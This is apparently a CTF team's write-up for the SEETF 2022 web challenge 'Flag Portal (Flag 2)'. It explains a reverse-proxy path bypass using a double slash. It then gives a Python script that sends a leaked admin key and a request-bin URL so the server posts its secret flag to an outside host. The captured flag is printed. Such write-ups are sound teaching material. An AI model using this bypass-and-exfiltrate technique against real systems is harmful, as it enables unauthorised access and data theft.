## Challenge Name: Flag Portal (Flag 2)
Author: zeyu2001  
Category: Web  
Points: 100  
Solves: 57  
<br>
>Welcome to the flag portal! Only admins can view the flag for now. Too bad you're behind a reverse proxy ¯\(ツ)/¯<br><br>
Note: There are two flags for this challenge.<br><br>
http://flagportal.chall.seetf.sg:10001

MD5: 0c4f55a57bd99f8438711c3734ccbf4f

[Download Zip File](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%202)/files/web_flagportal.zip "Zip File")

### Approach
This challenge is the 2nd part of a 2-part challenge so please read [our writeup for the first part of this challenge](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%201)/Flag%20Portal%20(Flag%201).md) first if you haven't already.

From the previous part of the challenge, we have an admin key which is `spendable-snoring-character-ditzy-sepia-lazily`.  

This time, the page of interest is at `/api/flag-plz`. However, the proxy maps this to http://backend/forbidden too. Luckily, we can use the same method as from the previous part of the challenge to bypass this, thus getting an url of `http://flagportal.chall.seetf.sg:10001/api//flag-plz`.

Now, that we can access this site, how do we get the flag? Let's take a look at the source code first!

Looking at the code, we find a relevant snippet in the [backend/server.py](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%202)/files/web_flagportal/distrib/backend/server.py) file.
```py
@app.route('/flag-plz', methods=['POST'])
def flag():
    if request.headers.get('ADMIN_KEY') == os.environ['ADMIN_KEY']:
        if 'target' not in request.form:
            return 'Missing URL'

        requests.post(request.form['target'], data={
            'flag': os.environ['SECOND_FLAG'],
            'congrats': 'Thanks for playing!'
        })

        return 'OK, flag has been securely sent!'
            
    else:
        return 'Access denied'
```

From here, we can gather that we can make a post request to the challenge server with a [request bin](https://requestbin.com/) for the server to send the flag too. We also realise that the admin key needs to be in the post request header for this to work. Now, let's work on a python script to do the above.
```py
import requests

url = "http://flagportal.chall.seetf.sg:10001/api//flag-plz"
header = {'admin-key': "spendable-snoring-character-ditzy-sepia-lazily"}
data = {"target": "http://enihhe0s1djb.x.pipedream.net/"}
f = requests.post(url=url, headers=header, data=data)
print(f.content)
```

This sends the flag, which is `SEE{y4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9}`, to our request bin. Yay!
![img](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%202)/files/Request.png "Image")

### Flag
`SEE{y4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9}`

---
[Back to home](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups)